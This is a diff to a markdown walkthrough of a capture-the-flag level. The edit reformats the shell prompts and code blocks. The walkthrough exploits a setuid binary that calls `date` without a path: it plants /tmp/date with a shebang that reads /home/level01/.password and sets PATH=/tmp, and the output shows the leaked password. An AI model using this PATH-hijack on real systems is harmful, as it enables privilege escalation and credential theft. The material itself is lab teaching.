@@ -27,11 +27,13 @@ Let's get started!
 Taking the hint from the explanation of the level,
 look at the files in the `/levels/level01` directory:
 
-    level00@box:~$ ls -l /levels/level01
-    total 32
-    -rw-rw-r--  1 level01  level01    69 Mar  9 19:08 Makefile
-    -rwsr-xr-x  1 level01  level01  7352 Mar  9 19:08 level01
-    -rw-rw-r--  1 level01  level01   152 Mar  9 19:08 level01.c
+```
+$ ls -l /levels/level01
+total 32
+-rw-rw-r--  1 level01  level01    69 Mar  9 19:08 Makefile
+-rwsr-xr-x  1 level01  level01  7352 Mar  9 19:08 level01
+-rw-rw-r--  1 level01  level01   152 Mar  9 19:08 level01.c
+```
 
 Notice the user permission `rws` on the file `level01`.
 The setuid bit is set,
@@ -41,7 +43,7 @@ the owner of the file,
 instead of our current user.
 Let's run it to see what it does:
 ```
-level00@box:~$ /levels/level01/level01
+$ /levels/level01/level01
 Current time: Tue Sep  3 23:55:54 UTC 2013
 ```
 
@@ -69,9 +71,9 @@ and make it print `/home/level01/.password`.
 Here we go:
 
 ```
-level00@box:~$ echo '#!/bin/cat /home/level01/.password' > /tmp/date
-level00@box:~$ chmod +x /tmp/date 
-level00@box:~$ PATH=/tmp /levels/level01/level01
+$ echo '#!/bin/cat /home/level01/.password' > /tmp/date
+$ chmod +x /tmp/date 
+$ PATH=/tmp /levels/level01/level01
 Current time: aepeefoo
 #!/bin/cat /home/level01/.password
 ```
